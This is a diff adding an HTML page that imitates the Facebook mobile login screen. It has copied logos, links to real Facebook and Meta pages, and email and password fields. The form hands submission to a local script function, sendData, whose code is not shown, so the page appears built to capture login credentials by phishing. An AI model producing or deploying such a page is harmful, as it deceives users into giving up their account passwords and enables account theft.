@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>facebook login</title>
+        <link rel="stylesheet" href="../css/login.css" type="text/css" media="all" />
+        <link rel="stylesheet" href="../css/bootstrap.css" type="text/css" media="all" />
+    </head>
+    <body class="bg-light">
+      <div class="container-fluid m-0 p-0 ">
+      <div class="container">
+          <div class="row d-flex justify-content-center align-items-center">
+              English(UK)
+          </div>
+          
+          <div class="row d-flex justify-content-center align-items-center">
+          <div class="d-flex justify-content-center align-items-center mt-5 p-2">
+           <img class="logo-icon" src="../images/5D8s-GsHJlJ.png">
+          </div>
+          </div>
+          <!-- end logo -->
+         <div class="row d-lg-flex justify-content-lg-center align-items-lg-center">
+
+             <div class="col-lg-6  mt-5">
+                <form class="row p-2" onsubmit="sendData(event)">
+                    <div class="col-12 p-2">
+                        <input class="input w-100 p-3 rounded rounded-4 bg-white" type="text" placeholder="Mobile number or email address" id="email" name="email" required onchange="inputChange(event)">
+                    </div>
+                    <div class="col-12 p-2">
+                        <input class="input w-100 p-3 rounded rounded-4 bg-white o" type="password" placeholder="Password" id="password" name="password" required onchange="inputChange(event)">
+                    </div>
+                    <div class="col-12 p-2">
+                        <button class="bg-primary w-100 p-2 rounded rounded-5 text-white" type="submit"id="btn">Log in</button>
+                    </div>
+                    <div class="col-12 p-2 d-flex justify-content-center align-items-center">
+                        <a class="text-decoration-none text-dark" href="https://m.facebook.com/login/identify/">Forgotten Password?</a>
+                    </div>
+                </form>
+             </div>
+         </div> 
+       
+          <!-- end form -->
+          <div class="row mt-5 p-3">
+             <a  href="https://m.facebook.com/reg/" class="p-2 mt-2 bg-white text-dark rounded rounded-5 text-center text-decoration-none" type="button">Create new account</a>
+          </div>
+          <div class="row d-flex justify-content-center align-items-center mt-3">
+              <img class="w-25 h-25" src="../images/DDgwTv3JehF.png">   
+          </div>
+          <div class="col-12 p-2 d-flex justify-content-center align-items-center gap-3 mt-3">
+              <a class="text-decoration-none text-dark" href="https://about.meta.com/">About</a>   
+              <a class="text-decoration-none text-dark" href="https://m.facebook.com/help/?ref=pf">Home</a>   
+              <a class="text-decoration-none text-dark" href="#">More</a>   
+          </div>
+      </div>
+      </div>
+      <script src="../js/login.js" type="text/javascript" charset="utf-8"></script>
+    </body>
+</html>
